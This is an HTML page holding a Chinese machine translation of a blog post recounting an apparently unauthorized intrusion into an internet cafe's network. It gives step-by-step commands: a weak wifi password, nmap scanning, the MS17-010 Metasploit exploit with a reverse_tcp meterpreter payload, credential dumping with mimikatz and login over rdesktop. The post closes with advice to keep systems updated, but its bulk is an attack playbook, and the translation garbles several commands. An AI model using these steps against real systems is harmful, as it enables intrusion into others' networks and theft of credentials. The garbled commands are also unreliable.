<html>
<head>
<title>How I hacked into an internet cafe?</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我是怎么黑进网吧的？</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-hacked-into-an-internet-cafe-4140cc4103d8?source=collection_archive---------0-----------------------#2018-11-25">https://infosecwriteups.com/how-i-hacked-into-an-internet-cafe-4140cc4103d8?source=collection_archive---------0-----------------------#2018-11-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ab82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">刚刚结束期末考试，所以我想为什么不写一篇关于我最喜欢的黑客的文章。这是我几个月前进行的一次老黑客攻击，但它在今天仍然与运行传统操作系统且不定期更新的系统密切相关。这篇文章离我很近，因为这是我第一次能够打开远程桌面客户端。</p><h1 id="9c1c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">介绍</h1><p id="8a40" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">让我给你介绍一下黑客的概况，我通过闯入wifi接入点进入网络，然后利用系统容易受到中小企业攻击的事实(CVE-2017–010)，其端口445是开放的。然后，我使用Metasploit启动一个反向shell并获得对系统的控制，然后我加载mimikatz以获得登录凭证，然后使用remote desktop client，这使我能够完全访问文件和文件夹。</p><p id="1cb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">说起来容易做起来难，让我给你看看整个事情是如何进行的。</p><h1 id="f5a0" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">让我们开始吧！</h1><p id="df0e" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">所以，黑客攻击从我通过他们的wifi进入他们的网络开始，这个wifi有一个愚蠢的密码保护，这是非常常见的(123pass456)，你可以在这里阅读我用什么方法实现的-&gt; <a class="ae lo" href="https://medium.com/bugbountywriteup/how-i-hacked-into-my-neighbours-wifi-and-harvested-credentials-487fab106bfc" rel="noopener">黑客wifi </a>。</p><p id="b2e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，一旦我进入他们的网络，我就执行基本的nmap命令，以便更好地了解连接到他们网络的PC、打印机或电话。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi lp"><img src="../Images/35fbd2ede985b0a3441257cc7c9abd0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qWEQlfAvtHckl5aW7DXbMw.png"/></div></div></figure><p id="9f79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦我获得了他们网络上所有系统的IP地址，我就使用nmap扫描每个系统，然后我发现了这个。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mb"><img src="../Images/733257d08ac1c1d74159e4c97d6920a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xbY4uRIUlv94kyLcT2UNIA.png"/></div></div></figure><h1 id="e622" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">黑客！</h1><p id="e19a" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">我特别关注445端口。我直接使用了nmap默认提供的脚本。</p><blockquote class="mc md me"><p id="36cb" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">root @ kali:~ # CD/usr/share/nmap/scripts/</p></blockquote><p id="d2ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一次，我在scripts文件夹中搜索smb漏洞。</p><blockquote class="mc md me"><p id="5f47" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">root@kali:~#ls *smb*</p></blockquote><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mj"><img src="../Images/436214cdddae5d0b851d7f88f9b66187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q5mQVeTfRMc7vGas01vavA.png"/></div></div></figure><p id="8137" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到了上面的图像，通过它们我继续使用sm b-vuln-ms17–010 . NSE。要使用它，我必须使用这个命令</p><blockquote class="mc md me"><p id="a65f" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">root@kali:~#nmap -p 135，136，445-script = sm b-vuln-ms-17–010 . NSE 10 . 1 . 32 . 17-v</p></blockquote><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mk"><img src="../Images/c498561d2c455495fb7bc487d6e8849a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zifAC-Ld60c9mL2dgwVbtA.png"/></div></div></figure><p id="2643" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到了以下输出。如你所见，风险系数很高，所以我的莫拉莱斯非常高，因为我确信现在攻击肯定会通过。进一步攻击机器的目的是弄清楚利用这个漏洞我可以获得多少访问权限。</p><p id="a30b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我马上打开metaspolit，输入以下命令</p><blockquote class="mc md me"><p id="b52b" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">msf &gt;使用exploit/windows/SMB/ms17 _ 010 _ psexec</p></blockquote><p id="c384" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我用来开始利用metasploit的第一个命令。</p><blockquote class="mc md me"><p id="2d64" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">MSF exploit(windows/SMB/ms17 _ 010 _ psexec)&gt;设置有效负载windows/meter preter/reverse _ TCP</p></blockquote><p id="a7c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个命令用来指定我要使用的漏洞利用，就是基于这个漏洞。</p><blockquote class="mc md me"><p id="d916" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">msf漏洞利用(windows/smb/ms17_010_psexec)&gt;设置LHOST 10.1.37.143</p><p id="9be2" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">MSF exploit(windows/SMB/ms17 _ 010 _ psexec)&gt; set RHOST 10 . 1 . 32 . 17</p></blockquote><p id="803c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的命令中，我指定了LHOST和RHOST。LHOST ip是执行攻击的人的IP地址，而RHOST IP os是被执行攻击的人的IP地址。</p><blockquote class="mc md me"><p id="52ff" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">msf漏洞利用(windows/smb/ms17_010_psexec)&gt;漏洞利用</p></blockquote><p id="c39d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦攻击向量被填充，我就开始利用。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ml"><img src="../Images/38405c732aea3b81f87a1dbb1098d34b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cZDYzaUNUTZJInZHFkrJUA.png"/></div></div></figure><p id="7aa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后它就出现了，米特尔外壳。现在，即使是对黑客感兴趣的普通人也知道，一旦我有了这个，我就几乎完全控制了系统。</p><p id="48ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，现在是我开始开发rdp客户端的时候了。为了实现这一点，我输入了以下命令。</p><blockquote class="mc md me"><p id="371c" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">meterpreter &gt;加载mimikatz</p></blockquote><p id="587a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Mimikatz是</strong>一个开源实用程序，支持通过其sekurlsa模块查看来自Windows lsass(本地安全授权子系统服务)的凭证信息，其中包括明文密码</p><blockquote class="mc md me"><p id="5a57" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">meterpreter&gt;kerberos</p></blockquote><p id="df66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我这样做是为了找出受害者系统的用户名和密码。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mm"><img src="../Images/e7008d6fe326f320ff41c5021747b06a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5wd1NBUj6ymZAtJ5w5A5eg.png"/></div></div></figure><p id="b2ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我一拿到证书。我打开了一个新的终端，并开始远程桌面客户端尝试远程登录系统。</p><blockquote class="mc md me"><p id="da4c" class="jn jo mf jp b jq jr js jt ju jv jw jx mg jz ka kb mh kd ke kf mi kh ki kj kk ij bi translated">root@kali~:rdesktop 10.1.32.17</p></blockquote><p id="d164" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这启动了远程桌面客户端，我输入了登录凭证，嘣！</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mn"><img src="../Images/b8c1e0cd85325c9b317409e3a525e959.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8AjQsZHxIcBqJ2rMOIRMfQ.png"/></div></div></figure><p id="56a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这给了我对系统的完全访问权，因为我可以操纵任何超过这一点的东西。</p><h1 id="f4fc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">道德的</h1><p id="47a4" class="pw-post-body-paragraph jn jo iq jp b jq lj js jt ju lk jw jx jy ll ka kb kc lm ke kf kg ln ki kj kk ij bi translated">这是一个令人难以置信的攻击场景，因为在大多数reverse_tcp meterpreter shell中，您需要用户进行某种交互，或者程序需要在系统中运行，而这个特定的漏洞并不需要这样做，因此保护您免受此类攻击的最佳方法是随时更新您的系统操作系统。</p><p id="b83e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">附:文章中使用的图片不是来自我的攻击，而是来自我的一个朋友，他在不同的系统上进行了相同的攻击。这些图片已经得到了所有者的许可。</p><p id="1f00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在这里观看他发表的视频&gt;【https://bit.ly/2r3jszO<a class="ae lo" href="https://bit.ly/2r3jszO" rel="noopener ugc nofollow" target="_blank"/></p><p id="5979" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">如果你喜欢，请鼓掌&amp;让我们合作。获取、设置、破解！</strong></p><p id="59b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网址:<a class="ae lo" href="https://www.aditya12anand.com/" rel="noopener ugc nofollow" target="_blank">aditya12anand.com</a>|捐赠:<a class="ae lo" href="https://paypal.me/aditya12anand" rel="noopener ugc nofollow" target="_blank">paypal.me/aditya12anand</a></p><p id="d6c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">电报:<a class="ae lo" href="https://t.me/aditya12anand" rel="noopener ugc nofollow" target="_blank">https://t.me/aditya12anand</a></p><p id="569e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特:<a class="ae lo" href="https://twitter.com/aditya12anand?source=post_page---------------------------" rel="noopener ugc nofollow" target="_blank">twitter.com/aditya12anand</a></p><p id="b0e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">领英:<a class="ae lo" href="https://www.linkedin.com/in/aditya12anand/?source=post_page---------------------------" rel="noopener ugc nofollow" target="_blank">linkedin.com/in/aditya12anand/</a></p><p id="1473" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">电子邮件:aditya12anand@protonmail.com</p></div></div>    
</body>
</html>